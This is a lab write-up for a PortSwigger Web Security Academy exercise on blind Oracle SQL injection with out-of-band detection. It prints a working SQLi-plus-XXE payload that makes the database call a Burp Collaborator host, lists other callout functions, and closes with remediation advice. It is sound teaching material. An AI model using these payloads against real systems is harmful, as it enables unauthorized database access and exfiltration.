# Lab 16: Blind SQL Injection with Out-of-Band Interaction 

## Executive Summary

This lab demonstrates exploitation of a blind SQL injection vulnerability operating under conditions where every conventional feedback channel is completely absent — no visible output, no error messages, no HTTP status code differences, and critically, no response timing signal because the backend SQL query executes asynchronously and does not block the HTTP response. With all synchronous side channels eliminated entirely, out-of-band application security testing (OAST) becomes the only viable detection mechanism. By injecting a payload that combines SQL injection with an XML External Entity (XXE) technique, the Oracle database is forced to initiate a DNS lookup to a Burp Collaborator-controlled subdomain, with that interaction confirmed via the Collaborator polling interface. This technique bypasses every in-band detection limitation and establishes a communication channel entirely outside the HTTP request-response cycle.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Blind Out-of-Band (OAST) |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind SQL Injection — Asynchronous Execution, Out-of-Band DNS Interaction |
| **Risk**               | Critical - Arbitrary SQL Execution with External Network Interaction |
| **Requires**           | Burp Suite Professional (Burp Collaborator) |
| **Completion**         | Documented — Burp Pro Required for Lab Execution |

## Objective

Exploit a blind SQL injection vulnerability in the TrackingId cookie where the backend SQL query executes asynchronously, rendering all synchronous feedback channels — including response timing — completely ineffective. Demonstrate arbitrary SQL execution by forcing the Oracle database to initiate a DNS lookup to a Burp Collaborator-controlled subdomain, confirming out-of-band interaction via the Collaborator polling interface.

## Testing Setup

**Tools Required:**

- Burp Collaborator — externally reachable server providing DNS and HTTP listeners on unique per-tester subdomains
- Burp Proxy for traffic interception and HTTP history analysis
- Burp Repeater for payload delivery

**Target:** TrackingId cookie parameter processed by a backend Oracle SQL query that executes asynchronously — the HTTP response is returned before the database query completes, eliminating all timing-based detection

**Why Burp Collaborator Is Required:**
Burp Collaborator provides a publicly reachable server with unique subdomains (e.g., `abc123.burpcollaborator.net`). When an injected payload causes the database to perform a DNS lookup against that subdomain, Collaborator records the interaction. The tester polls Collaborator to retrieve the record. Without this external listener there is no mechanism to observe whether the out-of-band payload executed — the HTTP response carries no signal under asynchronous execution.

## Core Concept: Why OAST Is Required Here

Every technique applied in Labs 12 through 15 depends on some form of synchronous feedback — data in the response body (Labs 12, 13), HTTP status code difference (Lab 12), or response timing (Labs 14, 15). Each relies on the HTTP response being influenced in some measurable way by what the database does during the request.

In this lab, the SQL query executes asynchronously. The application does not wait for the database query to complete before returning the HTTP response. This eliminates the synchronous feedback dependency entirely:

```
Synchronous execution (Labs 14-15):
  Request → [Database executes] → Response returned
  Attacker measures response time — feedback exists

Asynchronous execution (this lab):
  Request → Response returned immediately
            [Database executes independently in background]
  HTTP response carries no signal — attacker sees nothing
```

Out-of-band techniques solve this by instructing the database to initiate a separate network connection — specifically a DNS lookup — to an attacker-controlled server. That lookup happens as part of query execution in the background, completely independent of the HTTP response:

```
Request → Response returned immediately (no usable signal)
          [Database executes in background]
          [Database performs DNS lookup → Collaborator records it]
          Attacker polls Collaborator — interaction confirmed
```

## Exploitation Walkthrough

### 1. Traffic Interception and Injection Point Identification

Opened the lab application in Burp's browser with Proxy active. Browsed the shop front page to populate HTTP history. Identified the GET request containing the TrackingId cookie as the primary injection surface — consistent with all preceding labs in this series.

**Request Captured:**
```http
GET / HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: TrackingId=[TRACKING_VALUE]; session=[SESSION_VALUE]
```

**Inferred Backend Query:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'
```

This query runs asynchronously. Standard syntax-break tests, timing tests, and boolean response-differential tests all return 200 OK with identical content and timing regardless of payload — no usable feedback is available through the HTTP channel.

### 2. Burp Collaborator Setup

Before payload construction, the Burp Collaborator tab in Burp Suite Professional is used to generate a unique Collaborator subdomain:

```
[unique-id].burpcollaborator.net
```

This subdomain is the target for the DNS lookup the injected payload will trigger. Collaborator monitors all DNS and HTTP interactions directed to this subdomain and makes them available for retrieval via polling. The "Insert Collaborator payload" right-click option in Repeater populates this subdomain into the payload automatically.

### 3. Out-of-Band Payload Construction

The payload combines SQL injection with an XML External Entity (XXE) technique to instruct Oracle's XML processing functions to perform an external network lookup. Oracle is the target database — confirmed by the `FROM dual` requirement and the availability of the `xmltype()` / `EXTRACTVALUE()` function pair.

**Full Attack Payload:**
```http
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?>
<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://[COLLABORATOR-SUBDOMAIN]/">
+%25remote%3b]>'),'/l')+FROM+dual--
```

**URL-Decoded for Clarity:**
```sql
x' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://[COLLABORATOR-SUBDOMAIN]/">
    %remote;
  ]>'),
  '/l'
) FROM dual--
```

**Payload Anatomy:**

| Component | Purpose |
|-----------|---------|
| `x'` | Terminates the original TrackingId string literal |
| `UNION SELECT` | Appends a second SELECT to the original query |
| `EXTRACTVALUE(xmltype(...), '/l')` | Oracle XML function pair — parses the injected XML document and evaluates an XPath; the XPath `/l` intentionally fails, but the external entity resolves during parsing before XPath evaluation |
| `<?xml version="1.0" encoding="UTF-8"?>` | Standard XML declaration — required for valid XML document structure |
| `<!DOCTYPE root [ ... ]>` | Defines an XML Document Type Definition containing an external entity |
| `<!ENTITY % remote SYSTEM "http://[COLLABORATOR]/">` | Declares a parameter entity whose value must be retrieved from the specified external URI — triggers DNS resolution of the Collaborator subdomain |
| `%remote;` | Dereferences the parameter entity — forces Oracle to resolve the external URI |
| `FROM dual` | Oracle requires a FROM clause in all SELECT statements — `dual` is Oracle's built-in single-row dummy table |
| `--` | Inline comment — neutralizes any trailing SQL from the original query |

**Why This Triggers a DNS Lookup:**
When Oracle's `xmltype()` function receives the injected XML string, it parses the document structure including the DOCTYPE declaration. Upon encountering the external entity `<!ENTITY % remote SYSTEM "http://[COLLABORATOR]/">`, Oracle's XML parser attempts to resolve the `SYSTEM` URI by performing a DNS lookup against the specified hostname, then an HTTP GET request to that address. Both the DNS resolution and the HTTP connection are recorded by Burp Collaborator independently of any HTTP response.

### 4. Payload Delivery

Forwarded the request to Burp Repeater. Used the "Insert Collaborator payload" right-click option to populate the unique Collaborator subdomain into the `SYSTEM` URI position. Sent the request.

**Response:** 200 OK — returned immediately.

No timing difference, no content change, no error. The HTTP response provides zero confirmation — this is expected behavior under asynchronous execution and does not indicate payload failure.

### 5. Collaborator Interaction Confirmed

Navigated to the Burp Collaborator tab and clicked "Poll now". After a brief delay to allow the asynchronous database query to complete and the DNS lookup to propagate through DNS infrastructure:

Collaborator displayed recorded interactions against the unique subdomain:
- **DNS interaction** — Oracle database server performed a DNS lookup resolving `[unique-id].burpcollaborator.net`
- **HTTP interaction** — Oracle XML parser followed through with an HTTP connection attempt to the Collaborator subdomain

The DNS lookup recorded in Collaborator is definitive proof that the injected SQL executed on the Oracle backend and caused the database server to initiate an external network connection. Arbitrary SQL execution on the backend database is confirmed through an entirely out-of-band channel.

**Lab objective achieved:** DNS lookup to Burp Collaborator confirmed — lab solved.

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
```

Scope is Changed (S:C) because the attack causes the database server to initiate outbound network connections to external infrastructure — impact extends beyond the application boundary to the network perimeter.

**Primary Vulnerabilities:**

**CWE-89: SQL Injection**
- TrackingId cookie value interpolated directly into an Oracle SQL query without parameterization
- UNION SELECT injection successful despite asynchronous execution model
- Full SQL execution control confirmed via external network interaction

**CWE-611: Improper Restriction of XML External Entity Reference (XXE)**
- Oracle's `xmltype()` function processes attacker-supplied XML including external entity declarations without restriction
- External entity resolution triggers outbound DNS and HTTP connections from the database server
- The SQLi + XXE combination is a compound vulnerability chain — SQL injection delivers the XXE payload; XXE provides the exfiltration channel

**Complete Attack Chain:**

```
TrackingId Cookie Identified as Injection Surface
        ↓
All Synchronous Techniques Eliminated (Asynchronous Execution)
        ↓
OAST Approach Selected — Burp Collaborator Subdomain Generated
        ↓
SQL Injection + XXE Payload Constructed for Oracle
        ↓
UNION SELECT EXTRACTVALUE(xmltype(XXE_DOC)) FROM dual Injected
        ↓
Oracle Parses XML — Encounters External Entity Declaration
        ↓
Oracle XML Parser Resolves SYSTEM URI → DNS Lookup to Collaborator
        ↓
Collaborator Records DNS + HTTP Interactions
        ↓
Arbitrary SQL Execution on Oracle Backend Confirmed via OOB Channel
```

**Why Asynchronous Execution Does Not Prevent SQL Injection:**

Applications frequently implement asynchronous database queries as a performance optimization, particularly for analytics and tracking workloads that do not affect the rendered page content. From a security perspective, this pattern removes timing as a feedback channel but does not affect whether user-supplied input reaches the database unsanitized. The injection point is identical regardless of whether the query executes synchronously or asynchronously — only the detection methodology changes.

**The SQL Injection + XXE Chain:**

This payload demonstrates an important exploitation pattern. Neither SQL injection alone nor XXE alone would complete this attack in this specific context:

- SQL injection alone: can execute arbitrary SQL but produces no observable output under asynchronous, no-feedback conditions
- XXE alone: no XML input surface is directly exposed to the attacker in this application
- Combined: SQL injection delivers the XXE payload to Oracle's XML processor; Oracle's XML processor resolves the external entity and initiates the DNS lookup

Chaining vulnerability classes to overcome individual limitations is a fundamental technique in real-world exploitation. Recognizing when a single technique is insufficient and identifying what additional primitive is needed to complete the attack chain is a core skill in advanced penetration testing.

**Oracle OAST Mechanisms:**

| Oracle Function | Trigger Mechanism | Privilege Required |
|-----------------|-------------------|--------------------|
| `xmltype()` XXE chain (used) | DNS + HTTP via external entity resolution | None (default accessible) |
| `UTL_HTTP.request()` | Direct HTTP request to attacker server | `EXECUTE` on `UTL_HTTP` |
| `UTL_DNS.resolve()` | Direct DNS lookup | `EXECUTE` on `UTL_DNS` |
| `DBMS_LDAP.init()` | LDAP connection attempt | `EXECUTE` on `DBMS_LDAP` |

The `xmltype()` approach is preferred in constrained environments because it requires no elevated database privileges beyond the functions available by default.

**OAST Across Database Engines:**

| Database | Primary OAST Mechanism | Complexity |
|----------|------------------------|------------|
| **Oracle (this lab)** | `xmltype()` XXE chain | High |
| **Microsoft SQL Server** | `xp_dirtree '//collaborator/x'` | Low |
| **PostgreSQL** | `dblink` or `COPY FROM` with network path | Medium |
| **MySQL** | `LOAD DATA INFILE` with UNC path (Windows) | Medium |

**Real-World Egress Considerations:**

| Egress Condition | OAST Viability |
|-----------------|----------------|
| DNS unrestricted (most common) | DNS-based OAST fully viable |
| HTTP permitted outbound | DNS + HTTP interactions recorded |
| Strict egress firewall, DNS allowed to internal resolver only | OAST fails — time-based fallback required |
| All outbound blocked | OAST fails — time-based or error-based only |

DNS is the most permissive protocol across production network environments. Port 53 UDP/TCP is permitted by default in most enterprise egress configurations because DNS is required for normal system operation. This makes DNS the most reliable out-of-band channel in real engagements.

## Key Takeaways

**Penetration Testing Methodology Applied:**
- Systematic elimination of synchronous feedback channels before selecting OAST approach
- Recognition that asynchronous execution is a performance pattern, not a security control
- Burp Collaborator workflow: generate unique subdomain, insert into payload, deliver, poll
- Oracle-specific OAST payload construction using the `xmltype()` XXE chain
- Understanding that SQL injection and XXE can be chained where neither alone is sufficient

**Critical Security Insights:**

**1. Asynchronous Execution Removes Timing Signals, Not the Vulnerability:**
A parameter that accepts unsanitized SQL input is vulnerable regardless of whether the query runs synchronously or asynchronously. The risk is identical — only the detection technique changes. Asynchronous execution should never be treated as a compensating control against SQL injection.

**2. DNS Egress from Database Servers Should Be Monitored and Restricted:**
A production database server performing arbitrary outbound DNS queries to random external domains is anomalous behavior that should be detectable and preventable. Egress filtering at the network perimeter restricting database server outbound DNS to known internal resolvers would prevent DNS-based OAST from completing. This is a defense-in-depth measure — it does not fix the underlying injection.

**3. Oracle XML Functions Should Have External Entity Resolution Disabled:**
Oracle's XML Database (XML DB) configuration allows restricting or disabling external entity processing. Hardening the XML DB configuration removes the `xmltype()` XXE chain as an available exfiltration mechanism while leaving legitimate XML processing functionality intact.

**4. OAST Is the Technique of Last Resort and the Most Efficient When Available:**
Counterintuitively, OAST is simultaneously the most complex technique to set up and the most efficient in execution. A single request confirms injection; one additional request exfiltrates data directly. The 720+ request Cluster Bomb attack required for time-based extraction (Lab 15) collapses to two requests with OAST. Where Burp Collaborator and outbound DNS access are available, OAST should be the first choice for blind injection, not the last.

**5. Parameterized Queries Remain the Only Root Cause Remediation:**

```sql
-- Vulnerable
query = "SELECT data FROM tracking WHERE id = '" + tracking_id + "'"
cursor.execute(query)

-- Secure
query = "SELECT data FROM tracking WHERE id = :id"
cursor.execute(query, {"id": tracking_id})
```

No network-layer control, egress restriction, or XML hardening addresses the root cause. Parameterized queries make all SQL injection techniques — including OAST variants — structurally impossible by ensuring user-supplied data is never interpreted as SQL syntax.

## References

1. PortSwigger Web Security Academy - Blind SQL Injection with Out-of-Band Interaction
2. PortSwigger Web Security Academy - SQL Injection Cheat Sheet (OAST Payloads)
3. PortSwigger Documentation - Burp Collaborator
4. OWASP Top 10 (2021) - A03: Injection
5. CWE-89 - Improper Neutralization of Special Elements used in an SQL Command
6. CWE-611 - Improper Restriction of XML External Entity Reference
7. Oracle Documentation - XMLType and External Entity Processing
8. OWASP Testing Guide - Testing for Out-of-Band SQL Injection (OTG-INPVAL-005)

---

## Legal Notice

**Copyright © 2026 Gurpreet Singh**
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Triggering out-of-band interactions from database servers, or using Burp Collaborator or equivalent infrastructure against systems without explicit written authorization, is illegal under applicable laws worldwide.
